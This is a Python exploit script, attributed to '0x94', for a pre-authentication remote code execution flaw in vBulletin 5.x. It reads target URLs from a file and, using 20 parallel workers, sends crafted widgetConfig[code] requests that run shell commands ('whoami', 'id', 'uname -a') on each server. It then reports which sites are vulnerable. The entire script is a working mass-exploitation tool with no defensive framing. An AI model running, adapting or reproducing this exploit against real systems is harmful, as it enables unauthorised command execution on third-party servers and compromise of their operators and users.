import  requests, re, sys
import  colorama
from    colorama        import *
from    urllib.parse    import urlparse
from    time            import time as timer
from    functools       import partial
from    multiprocessing import Pool
import codecs

colorama.init()
 


def inject( u ):
    url=u
    try:        
        
        params ={"routestring":"ajax/render/widget_php"}                        
        params["widgetConfig[code]"] = "echo shell_exec('whoami'); exit;"
        r=requests.post(url+"/ajax/render/widget_php",params = params, timeout= 15 )
        if r.status_code==200:
            if "nt authority" in r.text:
                
                print( Fore.RED + ' [+] URL : ' + Fore.GREEN + ' ' + url )
                print( '    ' + Fore.YELLOW + ' [+] OS      : ' + Fore.CYAN + ' ' + "WINDOWS" ) 
                return url
            else:
                params ={"routestring":"ajax/render/widget_php"}        
                params ["widgetConfig[code]"] = "echo shell_exec('whoami;echo :::;id;echo :::;uname -a'); exit;"            
                r= requests.post( url+"/ajax/render/widget_php", params = params, timeout= 15 )
                if "groups=" in r.text and  "uid=" in r.text and "gid=" in r.text:
                    print( Fore.RED + ' [+] URL : ' + Fore.GREEN + ' ' + url )
                    print( '    ' + Fore.YELLOW + ' [+] WHOAMI  : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[0].strip() )
                    print( '    ' + Fore.YELLOW + ' [+] ID      : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[1].strip() )
                    print( '    ' + Fore.YELLOW + ' [+] UNAME   : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[2].strip() + '\n' )
                    return url
                    
                
                    
            
                    
        else:
            return "noooo"
                
  
    except:
        return "noooo"

def main():
    
    print (Style.BRIGHT)
    print("vBulletin 5.x 0day pre-auth RCE | coder 0x94 | twitter.com/0x94")
    start        = timer()
    file_string  = ''
    final_result = []
    try:
        search_result = codecs.open("site.txt",'r',encoding='utf8').read().splitlines()

    except:
        print( 'site.txt not found in the current directory' )
        sys.exit(0)
    print (' [+] Executing Exploit for ' + Fore.RED + str( len( search_result ) ) + Fore.WHITE + ' Urls.\n')
    #inject(search_result[1])
    with Pool(20) as p:
        final_result.extend( p.map( inject, search_result ) )
    count=0
    for x in final_result:
        if  "noooo" not in str(x) and "None" not in str(x):
            count+=1
    print( 'Total URLs Scanned    : ' + str( len( search_result ) ) )
    print( 'Vulnerable URLs Found : ' + str(count))
    print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )

if __name__ == '__main__':
    main()


